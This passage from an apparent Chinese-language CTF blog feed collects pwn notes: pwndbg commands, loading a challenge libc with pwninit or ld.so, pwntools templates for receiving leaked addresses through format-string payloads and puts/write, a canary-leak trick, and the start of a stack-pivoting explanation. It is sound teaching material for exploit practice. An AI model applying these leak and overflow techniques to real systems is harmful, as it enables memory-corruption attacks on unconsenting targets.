查看当前所有内存段（代码段、栈、堆、libc）的基址和权限。遇到段错误崩溃时，<strong>第一反应打 <code>vmmap</code></strong>，看目标地址到底是不是 <code>rwx</code>（往往是因为想执行 shellcode 却跳到了 <code>rw-</code> 的不可执行段）。</p></li><li><p><strong>超级栈透视：<code>telescope</code> (简写 <code>tele</code>)</strong></p><ul><li><p><code>tele 20</code> 或者 <code>tele $rsp 20</code>：以极度优雅的格式打印栈顶往下的 20 个单位。</p></li><li><p><strong>神级特性</strong>：它不仅印出数值，还会递归解析指针！如果栈上有一个地址指向 libc，它会直接在一旁标出 <code>-&gt; libc_system_addr</code>，找链子极其方便。</p></li></ul></li><li><p><strong>大海捞针：<code>search</code></strong></p><ul><li><p><code>search &quot;/bin/sh&quot;</code>：在整个内存空间里搜索目标字符串。</p></li><li><p><code>search -p 0xdeadbeef</code>：在内存里寻找有没有哪个指针刚好指向了这个特定的地址。</p></li></ul></li><li><p><strong>计算溢出长度：<code>cyclic</code></strong> 如果在 IDA 里看不出数组距离返回地址多远：</p><ol><li><p>终端运行 <code>cyclic 200</code> 生成 200 个规律乱码字符（如 <code>aaaabaaacaaa...</code>）。</p></li><li><p>把乱码当作 payload 发送，程序崩溃报错，此时 <code>rip</code> 或 <code>ebp</code> 会被某个乱码（比如 <code>0x61616164</code>）覆盖。</p></li><li><p>回到 GDB 终端运行 <code>cyclic -l 0x61616164</code>，直接光速算出精确的 Padding 长度！</p></li></ol></li><li><p><strong>追踪执行流：<code>retaddr</code> 和 <code>got</code></strong></p><ul><li><p><code>retaddr</code>：瞬间打印出当前栈上所有的返回地址链（相当于增强版的 Backtrace）。</p></li><li><p><code>got</code>：打印程序当前的 GOT 表状况，直观看到哪个函数被我们劫持了。</p></li><li><p><code>libc</code>：直接打印出当前加载的 libc 基地址，方便你做本地偏移计算验证。</p></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;线下赛一般都断网，这里总结一些会用到的知识&lt;/p&gt;
&lt;h1 id=&quot;Linux-底层函数查阅指南&quot;&gt;&lt;a href=&quot;#Linux-</summary>
      
    
    
    
    <category term="PWN" scheme="http://example.com/categories/PWN/"/>
    
    <category term="PWN_ATTACK" scheme="http://example.com/categories/PWN/PWN-ATTACK/"/>
    
    <category term="PWN通用问题" scheme="http://example.com/categories/PWN/PWN-ATTACK/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="pwntools" scheme="http://example.com/tags/pwntools/"/>
    
    <category term="gdb" scheme="http://example.com/tags/gdb/"/>
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>PWN环境配置：强制ELF加载指定libc</title>
    <link href="http://example.com/2026/03/14/PWN/pwn_attack/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/%E5%BC%BA%E5%88%B6%E8%AE%A9elf%E9%93%BE%E6%8E%A5%E6%8C%87%E5%AE%9A%E7%9A%84libc/"/>
    <id>http://example.com/2026/03/14/PWN/pwn_attack/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/%E5%BC%BA%E5%88%B6%E8%AE%A9elf%E9%93%BE%E6%8E%A5%E6%8C%87%E5%AE%9A%E7%9A%84libc/</id>
    <published>2026-03-14T13:45:00.000Z</published>
    <updated>2026-03-15T08:56:17.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="如何强制-ELF-优先调用同一目录下的-libc？"><a href="#如何强制-ELF-优先调用同一目录下的-libc？" class="headerlink" title="如何强制 ELF 优先调用同一目录下的 libc？"></a>如何强制 ELF 优先调用同一目录下的 libc？</h1><p>在本地调试 Pwn 题目时，为了和远程服务器环境保持一致，我们必须强迫本地的 ELF 程序去加载题目提供的 <code>libc.so.6</code>。</p><p><strong>【致命前置警告】</strong>： <code>libc</code>（C语言运行库）和 <code>ld</code>（动态链接器）是<strong>死绑定的配套组件</strong>！如果你只强制替换了 <code>libc</code>，而没有替换系统默认的 <code>ld</code>，大概率会在运行瞬间直接报错 <code>Segmentation fault</code>。因此，下面的高阶方法都会强调<strong>两者同换</strong>。</p><p>实战中，我们只需要掌握以下两种最核心的方法，足以应对 100% 的比赛场景。</p><h2 id="自动化神器-pwninit-实战首选-有网环境"><a href="#自动化神器-pwninit-实战首选-有网环境" class="headerlink" title="自动化神器 pwninit (实战首选 / 有网环境)"></a>自动化神器 <code>pwninit</code> (实战首选 / 有网环境)</h2><p>实战中如果你有网络，请直接抛弃任何繁琐的手动步骤，使用这个自动化工具！</p><h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><p><code>pwninit</code> 是基于 Rust 开发的第三方工具，且依赖 <code>patchelf</code> 和 <code>elfutils</code>，第一次使用前需要在终端执行以下命令进行安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 安装底层依赖</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install patchelf elfutils</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 从 GitHub 下载编译好的 pwninit 二进制可执行文件</span></span><br><span class="line">wget https://github.com/io12/pwninit/releases/download/3.3.0/pwninit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 赋予执行权限，并移动到系统环境变量目录 (这样在任何地方都能直接敲 pwninit)</span></span><br><span class="line"><span class="built_in">chmod</span> +x pwninit</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> pwninit /usr/local/bin/</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ol><li><p>把你的 <code>elf_file</code> 和 <code>libc.so.6</code> 扔进同一个空文件夹。</p></li><li><p>终端输入一个命令：<br>   pwninit</p></li><li><p>工具会自动下载配套的 <code>ld</code>，自动执行修改，并生成一个 <code>elf_file_patched</code> 的文件。你直接拿带 <code>_patched</code> 后缀的文件去做题，环境问题完美解决</p></li></ol><h2 id="底层接管法-——-直接运行-ld-so-断网赛场神技"><a href="#底层接管法-——-直接运行-ld-so-断网赛场神技" class="headerlink" title="底层接管法 —— 直接运行 ld.so (断网赛场神技)"></a>底层接管法 —— 直接运行 <code>ld.so</code> (断网赛场神技)</h2><p>这是 AWDP 线下赛（纯断网环境）或者 <code>pwninit</code> 失效时最管用的一招。我们根本不修改原程序，而是去运行动态链接器，把程序当参数传给它。</p><p><strong>前提准备</strong>：你的目录下需要有题目给的 <code>libc.so.6</code>，以及从你本地 <code>glibc-all-in-one</code> 中找出来的对应版本的 <code>ld.so</code>（例如 <code>ld-linux-x86-64.so.2</code>）。</p><h3 id="如何精准获取配套的-ld-so？"><a href="#如何精准获取配套的-ld-so？" class="headerlink" title="如何精准获取配套的 ld.so？"></a>如何精准获取配套的 ld.so？</h3><p>该方法的核心前提是找到与题目 <code>libc.so.6</code> 绝对匹配的 <code>ld.so</code>。可通过以下标准流程获取：</p><p><strong>步骤 A：识别当前 libc 版本</strong> 通过查阅库文件内部的编译信息，确认具体的操作系统与版本号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings libc.so.6 | grep GNU</span><br><span class="line"><span class="comment"># 输出示例: GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.</span></span><br></pre></td></tr></table></figure><p><strong>步骤 B：提取对应版本的 ld.so</strong></p><ul><li><p><strong>途径 1 (借助 glibc-all-in-one)</strong>：本地环境应提前部署 <code>glibc-all-in-one</code> 工具。进入该工具目录，执行 <code>./download 2.31-0ubuntu9.18_amd64</code>。下载完成后，进入 <code>libs/</code> 对应的版本目录中，直接提取 <code>ld-linux-x86-64.so.2</code>。</p></li><li><p><strong>途径 2 (借助 Docker 镜像)</strong>：若无本地库缓存，可启动对应系统版本的 Docker 容器（例如 <code>ubuntu:20.04</code> 对应 glibc 2.31），使用 <code>docker cp</code> 命令将容器内 <code>/lib64/ld-linux-x86-64.so.2</code> 拷贝至宿主机当前目录。</p></li></ul><h3 id="终端调试执行"><a href="#终端调试执行" class="headerlink" title="终端调试执行"></a>终端调试执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ld-linux-x86-64.so.2 --library-path . ./elf_file</span><br></pre></td></tr></table></figure><p>_原理_：完美绕过系统的任何默认设置！明确指定了使用当前的 <code>ld</code>，并且告诉这个 <code>ld</code> 只在当前目录（<code>.</code>）找库，最后运行目标程序。<strong>此方法极其稳定，且不需要修改原文件分毫。</strong></p><h3 id="Pwntools-脚本内联执行-写在-EXP-里"><a href="#Pwntools-脚本内联执行-写在-EXP-里" class="headerlink" title="Pwntools 脚本内联执行 (写在 EXP 里)"></a>Pwntools 脚本内联执行 (写在 EXP 里)</h3><p>在写 Python 漏洞利用脚本时，直接把上面的终端命令变成一个列表传给 <code>process</code> 即可：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 告诉 pwntools 直接用同目录的 ld 启动程序</span></span><br><span class="line">p = process([<span class="string">&#x27;./ld-linux-x86-64.so.2&#x27;</span>, <span class="string">&#x27;--library-path&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;./elf_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来正常进行交互和攻击...</span></span><br></pre></td></tr></table></figure><h2 id="附录：glibc-all-in-one-部署与使用指南"><a href="#附录：glibc-all-in-one-部署与使用指南" class="headerlink" title="附录：glibc-all-in-one 部署与使用指南"></a>附录：glibc-all-in-one 部署与使用指南</h2><p>在断网或无法使用 <code>pwninit</code> 时，<code>glibc-all-in-one</code> 是获取任意版本 <code>ld.so</code> 和带有调试符号的 <code>libc</code> 的最强工具。建议在有网环境下提前完成部署并下载常用版本。</p><h3 id="获取与初始化配置"><a href="#获取与初始化配置" class="headerlink" title="获取与初始化配置"></a>获取与初始化配置</h3><p>在终端中依次执行以下命令，将其克隆至本地（建议放在常用的工具目录下，如 <code>~/tools/</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆仓库</span></span><br><span class="line">git <span class="built_in">clone</span> [https://github.com/matrix1001/glibc-all-in-one.git](https://github.com/matrix1001/glibc-all-in-one.git)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入目录</span></span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one</span><br><span class="line"></span><br><span class="line"><span class="comment"># 赋予相关脚本执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> a+x update_list extract download build</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取最新的可用 glibc 列表 (重要！必须先执行)</span></span><br><span class="line">./update_list</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="下载目标版本的-glibc"><a href="#下载目标版本的-glibc" class="headerlink" title="下载目标版本的 glibc"></a>下载目标版本的 glibc</h3><p>当你通过 <code>strings libc.so.6 | grep GNU</code> 确认了具体的版本号后（如 <code>2.31-0ubuntu9.9_amd64</code>），可以直接通过 <code>download</code> 脚本进行下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索本地支持下载的包</span></span><br><span class="line"><span class="built_in">cat</span> list | grep 2.31</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：Ubuntu 官方源会定期清理旧补丁包（如 9.9 版本可能会失效报 404 错误）。</span></span><br><span class="line"><span class="comment"># 必须严格复制上方 `cat list` 输出中存在的版本号！</span></span><br><span class="line"><span class="comment"># 例如终端列表中显示有 2.31-0ubuntu9.18_amd64，则执行：</span></span><br><span class="line">./download 2.31-0ubuntu9.18_amd64</span><br></pre></td></tr></table></figure><h3 id="提取-ld-so-进行使用"><a href="#提取-ld-so-进行使用" class="headerlink" title="提取 ld.so 进行使用"></a>提取 ld.so 进行使用</h3><p>下载完成后，文件会被统一解压并存放在 <code>glibc-all-in-one/libs/</code> 目录中。</p><p><strong>获取路径</strong>：<code>glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/ld-linux-x86-64.so.2</code></p><p>在实战中，可直接将该目录下的 <code>ld-2.31.so</code> 复制到你的题目目录下，随后配合 <strong>底层接管法 (<code>./ld-xxx.so --library-path .</code>)</strong> 或 <code>patchelf</code> 进行环境配置。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;如何强制-ELF-优先调用同一目录下的-libc？&quot;&gt;&lt;a href=&quot;#如何强制-ELF-优先调用同一目录下的-libc？&quot; class=&quot;headerlink&quot; title=&quot;如何强制 ELF 优先调用同一目录下的 libc？&quot;&gt;&lt;/a&gt;如何强制 ELF 优先</summary>
      
    
    
    
    <category term="PWN" scheme="http://example.com/categories/PWN/"/>
    
    <category term="PWN_ATTACK" scheme="http://example.com/categories/PWN/PWN-ATTACK/"/>
    
    <category term="PWN通用问题" scheme="http://example.com/categories/PWN/PWN-ATTACK/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="pwninit" scheme="http://example.com/tags/pwninit/"/>
    
    <category term="ld.so" scheme="http://example.com/tags/ld-so/"/>
    
  </entry>
  
  <entry>
    <title>PWN输出机制与泄露接收指南</title>
    <link href="http://example.com/2026/03/14/PWN/pwn_attack/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/%E8%BE%93%E5%87%BA%E6%A0%BC%E5%BC%8F/"/>
    <id>http://example.com/2026/03/14/PWN/pwn_attack/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/%E8%BE%93%E5%87%BA%E6%A0%BC%E5%BC%8F/</id>
    <published>2026-03-14T13:30:00.000Z</published>
    <updated>2026-03-14T13:53:35.342Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN-泄露输出与接收总结"><a href="#PWN-泄露输出与接收总结" class="headerlink" title="PWN 泄露输出与接收总结"></a>PWN 泄露输出与接收总结</h1><p>在 Pwn 实战中，拿到 Shell 的前提通常是完美地“泄露 (Leak)”出内存中的地址（如 Libc 基址、Canary、PIE 基址）。</p><p>然而，C 语言的不同输出函数有着截然不同的底层，如果不摸透它们，你的 Pwntools 脚本就会频繁遭遇 <code>EOFError</code>、<code>struct.error</code> 或死锁卡死。</p><h2 id="一、-C-语言三大输出函数特性对比"><a href="#一、-C-语言三大输出函数特性对比" class="headerlink" title="一、 C 语言三大输出函数特性对比"></a>一、 C 语言三大输出函数特性对比</h2><p>在寻找泄露 Gadget 或分析题目原本的输出漏洞时，必须一眼看穿这三个函数的本质区别：</p><div class="table-container"><table><thead><tr><th>输出函数</th><th>遇到 <code>\x00</code> 是否停止</th><th>是否自动追加 <code>\n</code></th><th>实战泄露评估</th><th>接收核心技巧</th></tr></thead><tbody><tr><td><strong><code>puts(addr)</code></strong></td><td><strong>是 (绝对截断)</strong></td><td><strong>是</strong></td><td><strong>最常见，但有坑</strong>。如果内存中相邻字节是 <code>\x00</code>，它就读不出来了。</td><td>接收后必须剔除末尾的 <code>\n</code>，且接收长度不固定。</td></tr><tr><td><strong><code>printf(addr)</code></strong></td><td><strong>是 (绝对截断)</strong></td><td>否</td><td><strong>神级武器</strong>。支持 <code>%s</code>、<code>%p</code>，是格式化字符串漏洞的根源。</td><td>用 <code>%p</code> 泄露时需提防前导 0 被吞；用 <code>%s</code> 泄露同 <code>puts</code> 怕 <code>\x00</code>。</td></tr><tr><td><strong><code>write(1, addr, len)</code></strong></td><td><strong>否 (无视截断)</strong></td><td>否</td><td><strong>最完美的泄露函数</strong>！你让它输出多少字节，它就死死输出多少，连 <code>\x00</code> 也会原样打出来。</td><td>根据参数 <code>len</code> 定长接收 <code>recv(len)</code>，最为稳定。</td></tr></tbody></table></div><h2 id="二、-printf-格式化输出的四大底层陷阱"><a href="#二、-printf-格式化输出的四大底层陷阱" class="headerlink" title="二、 printf 格式化输出的四大底层陷阱"></a>二、 <code>printf</code> 格式化输出的四大底层陷阱</h2><p>当我们利用 <code>%p</code> 或 <code>%s</code> 进行盲打或泄露时，常常被眼前的输出欺骗。以下是四大经典误区：</p><h3 id="前导零消失术-p-x"><a href="#前导零消失术-p-x" class="headerlink" title="前导零消失术 (%p / %x)"></a>前导零消失术 (<code>%p</code> / <code>%x</code>)</h3><p><strong>现象</strong>：64位地址本应是 16 个十六进制字符（8字节），但 <code>%p</code> 输出往往只有 12 个字符（如 <code>0x7ffff7a00000</code>）甚至更少。</p><p><strong>底层原因</strong>：<code>%p</code> 会把地址当成整数解析，<strong>抹杀所有无意义的前导 <code>0</code></strong>。</p><p><strong>极端情况</strong>：如果泄露的是一个空指针（<code>0x0000000000000000</code>），glibc 会直接输出字符串 <strong><code>(nil)</code></strong>，而不是 <code>0x0</code>！</p><p><strong>避坑方案</strong>：绝不要用定长 <code>recv(12)</code> 去接低位地址。在 Payload 尾部加上固定分隔符（如 <code>-</code>），使用 <code>recvuntil(b&quot;-&quot;)</code> 动态截取。</p><h3 id="解引用截断陷阱-s"><a href="#解引用截断陷阱-s" class="headerlink" title="解引用截断陷阱 (%s)"></a>解引用截断陷阱 (<code>%s</code>)</h3><p><strong>现象</strong>：用 <code>%s</code> 泄露 GOT 表时，有时只能泄露出一两个乱码字节，甚至什么都没有。</p><p><strong>底层原因</strong>：<code>%s</code> 会去读指针指向的内存，一旦在内存中读到 <code>\x00</code>（零字节），它立刻认为字符串结束，停止打印！</p><p><strong>实战影响</strong>：很多 GOT 表地址中间包含 <code>\x00</code>（尤其是高位全 0 时），导致泄露不完整。必须用 <code>.ljust(8, b&#39;\x00&#39;)</code> 在 Python 端强行补齐 8 字节。</p><h3 id="Canary-泄露的-x00-覆盖"><a href="#Canary-泄露的-x00-覆盖" class="headerlink" title="Canary 泄露的 \x00 覆盖"></a>Canary 泄露的 <code>\x00</code> 覆盖</h3><p><strong>现象</strong>：Canary 保护机制的最低位固定是 <code>\x00</code>（用来防 <code>puts</code> 和 <code>%s</code> 泄露的）。</p><p><strong>泄露手法</strong>：必须先用栈溢出<strong>刚好覆盖掉那个 <code>\x00</code></strong>（比如写个 <code>a</code>），然后再调用 <code>puts</code> 或 <code>printf</code>。这样它才会顺着往下把整个 Canary 带出来。接收后，记得把最低位手动改回 <code>\x00</code>。</p><h3 id="缓冲池死锁-No-setvbuf"><a href="#缓冲池死锁-No-setvbuf" class="headerlink" title="缓冲池死锁 (No setvbuf)"></a>缓冲池死锁 (No <code>setvbuf</code>)</h3><p><strong>现象</strong>：脚本写得很完美，但在本地或远程跑时，终端卡死，什么输出都收不到。</p><p><strong>底层原因</strong>：题目在 <code>main</code> 函数开头没有写 <code>setvbuf(stdout, 0, 2, 0);</code>。这导致 <code>printf</code> 的输出被缓存在了系统缓冲区里，没有带 <code>\n</code> 换行符就不会刷新到屏幕上。</p><p><strong>避坑方案</strong>：在 Payload 末尾强制加上 <code>\n</code>，或者使用不需要缓冲的 <code>write</code> 函数。</p><h2 id="三、-Pwntools-完美接收泄露地址模板"><a href="#三、-Pwntools-完美接收泄露地址模板" class="headerlink" title="三、 Pwntools 完美接收泄露地址模板"></a>三、 Pwntools 完美接收泄露地址模板</h2><p>不要每次都去重新想怎么解包地址，直接粘贴以下三套标准模板</p><h3 id="模板一：基于-p-的通用接收（防前导-0-缺失）"><a href="#模板一：基于-p-的通用接收（防前导-0-缺失）" class="headerlink" title="模板一：基于 %p 的通用接收（防前导 0 缺失）"></a>模板一：基于 <code>%p</code> 的通用接收（防前导 0 缺失）</h3><p><strong>适用场景</strong>：格式化字符串漏洞，用 <code>%p</code> 泄露栈或 libc。 </p><p><strong>核心思路</strong>：在 Payload 植入“结束标志符”，动态截取。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 发送带有分隔符的 payload</span></span><br><span class="line">payload = <span class="string">b&quot;%45$p-Okkk&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 过滤掉无用的前缀，直到看见 &quot;0x&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 核心：一直读取，直到遇见 &quot;-&quot; 为止。drop=True 表示不要把 &quot;-&quot; 本身包含进来</span></span><br><span class="line">leaked_str = p.recvuntil(<span class="string">b&quot;-&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 完美转为十六进制整数 (无论它是 12 位还是 6 位)</span></span><br><span class="line">leaked_addr = <span class="built_in">int</span>(leaked_str, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 完美泄露:&quot;</span>, <span class="built_in">hex</span>(leaked_addr))</span><br></pre></td></tr></table></figure><h3 id="模板二：基于-puts-的-64-位接收（防-n-和-x00-截断）"><a href="#模板二：基于-puts-的-64-位接收（防-n-和-x00-截断）" class="headerlink" title="模板二：基于 puts 的 64 位接收（防 \n 和 \x00 截断）"></a>模板二：基于 <code>puts</code> 的 64 位接收（防 <code>\n</code> 和 <code>\x00</code> 截断）</h3><p><strong>适用场景</strong>：ROP 链调用 <code>puts(got_addr)</code> 泄露地址。</p><p><strong>核心思路</strong>：剥离末尾的换行符，并用 <code>\x00</code> 将缺失的高位补齐到完整的 8 字节。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设程序执行了 puts(puts_got)</span></span><br><span class="line"><span class="comment"># puts 输出完地址后，必定会追加一个 \n (0x0a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 接收直到换行符，且丢弃换行符</span></span><br><span class="line">raw_bytes = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 剥离可能存在的回车符 (应对某些 \r\n 环境)</span></span><br><span class="line">raw_bytes = raw_bytes.strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 核心：因为 puts 遇到 \x00 就停了，64 位地址通常只有 6 个字节 (如 \x90\xd9\xc2\xf7\xff\x7f)</span></span><br><span class="line"><span class="comment"># 必须在右侧 (高位) 补齐 \x00 直到 8 个字节，否则 u64() 会报错！</span></span><br><span class="line">leaked_addr = u64(raw_bytes.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] puts 泄露地址:&quot;</span>, <span class="built_in">hex</span>(leaked_addr))</span><br></pre></td></tr></table></figure><h3 id="模板三：基于-write-或-recv-定长-的接收"><a href="#模板三：基于-write-或-recv-定长-的接收" class="headerlink" title="模板三：基于 write 或 recv(定长) 的接收"></a>模板三：基于 <code>write</code> 或 <code>recv(定长)</code> 的接收</h3><p><strong>适用场景</strong>：程序使用 <code>write(1, addr, 8)</code> 输出，或者你确信 <code>%p</code> 打印的是 64 位 Libc 地址（必是 12 个有效字符）。 </p><p><strong>核心思路</strong>：不依赖任何分隔符，直接数数。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 场景 A：确信 %p 输出的是 0x7f 开头的 libc 地址</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">leaked_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 场景 B：程序调用了 write 强行打出了完整的 8 字节原始二进制数据</span></span><br><span class="line">raw_bytes = p.recv(<span class="number">8</span>)</span><br><span class="line">leaked_addr = u64(raw_bytes)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="四、排错法则"><a href="#四、排错法则" class="headerlink" title="四、排错法则"></a>四、排错法则</h2><p>当你在 <code>u64()</code> 这一步遭遇报错时，立刻按照以下步骤排错：</p><p><strong>开天眼</strong>：在 Python 脚本开头加上 <code>context.log_level = &#39;debug&#39;</code>。</p><p><strong>看长度</strong>：观察终端里红色的 <code>[DEBUG] Received 0x... bytes:</code>。</p><p><strong>对症下药</strong>：</p><p>如果收到了 6 个字节，说明是 <code>\x00</code> 被吃掉了，加上 <code>.ljust(8, b&#39;\x00&#39;)</code>。</p><p>如果收到了 7 个字节，且最后一个字节是 <code>0x0a</code>，说明把 <code>puts</code> 的换行符吃进去了，先 <code>.strip(b&#39;\n&#39;)</code> 再补齐。</p><p>如果收到了乱码字符串，说明没加 <code>int(..., 16)</code>，把十六进制字符串当成了字节流解析</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN-泄露输出与接收总结&quot;&gt;&lt;a href=&quot;#PWN-泄露输出与接收总结&quot; class=&quot;headerlink&quot; title=&quot;PWN 泄露输出与接收总结&quot;&gt;&lt;/a&gt;PWN 泄露输出与接收总结&lt;/h1&gt;&lt;p&gt;在 Pwn 实战中，拿到 Shell 的前提通常是完</summary>
      
    
    
    
    <category term="PWN" scheme="http://example.com/categories/PWN/"/>
    
    <category term="PWN_ATTACK" scheme="http://example.com/categories/PWN/PWN-ATTACK/"/>
    
    <category term="PWN通用问题" scheme="http://example.com/categories/PWN/PWN-ATTACK/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="pwntools" scheme="http://example.com/tags/pwntools/"/>
    
    <category term="leak" scheme="http://example.com/tags/leak/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出进阶技巧</title>
    <link href="http://example.com/2026/03/14/PWN/pwn_attack/stack_overflow/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6%E6%8A%80%E5%B7%A7/"/>
    <id>http://example.com/2026/03/14/PWN/pwn_attack/stack_overflow/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6%E6%8A%80%E5%B7%A7/</id>
    <published>2026-03-14T02:00:00.000Z</published>
    <updated>2026-03-13T13:09:27.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="目录："><a href="#目录：" class="headerlink" title="目录："></a>目录：</h1><p>进阶技巧里包括</p><ul><li><p>[x] <strong>栈迁移 (Stack Pivoting)</strong></p></li><li><p>[ ] <strong>Ret2csu (通用 Gadget 利用)</strong></p></li><li><p>[ ] <strong>SROP (Sigreturn Oriented Programming)</strong></p></li><li><p>[ ] <strong>BROP (Blind ROP)</strong></p></li></ul><h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><h2 id="适用条件："><a href="#适用条件：" class="headerlink" title="适用条件："></a>适用条件：</h2><p>在打 Pwn 的过程中，我们经常会遇到一种情况：<strong>溢出空间太小了</strong> </p><p>比如，程序只允许你溢出 8 到 16 个字节。这点空间刚够覆盖 <code>rbp/ebp</code> 和 <code>返回地址</code>，根本写不下一条完整的 ROP 链（比如泄露 Libc + 调用 system）。</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>要实现栈迁移，我们必须利用程序结束时必定会执行的汇编指令组合：<strong>leave; ret</strong></p><p>在底层，这两条指令等价于以下三个原子操作（以 32 位为例）：</p><ul><li><p><strong><code>leave</code></strong> 等价于：</p><ol><li><p><code>mov esp, ebp</code> （将 ebp 的值赋给 esp）</p></li><li><p><code>pop ebp</code> （将当前栈顶的内容弹给 ebp，esp 随之 +4）</p></li></ol></li><li><p><strong><code>ret</code></strong> 等价于：<code>pop eip</code> （将当前栈顶的内容弹给 